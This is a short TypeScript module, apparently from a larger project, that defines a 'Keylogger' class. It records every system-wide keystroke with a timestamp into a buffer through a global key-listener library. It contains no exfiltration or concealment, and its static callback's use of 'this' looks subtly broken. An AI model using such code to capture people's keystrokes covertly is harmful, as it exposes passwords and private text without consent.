import { GlobalKeyboardListener, type IGlobalKeyEvent } from 'node-global-key-listener'
import { Keypress } from '../../types'

class Keylogger {
  private static buffer: Array<Keypress> = []
  private static listener: GlobalKeyboardListener = new GlobalKeyboardListener()
  constructor() {
    Keylogger.buffer = []
    Keylogger.listener.addListener(Keylogger.log)
  }
  private static log(event: IGlobalKeyEvent): void {
    this.buffer.push({
      key: event.name as string,
      pressedAt: Date.now()
    })
  }
  flush(): Array<Keypress> {
    const buffer = [...Keylogger.buffer]
    Keylogger.buffer = []
    return buffer
  }
}

export default Keylogger
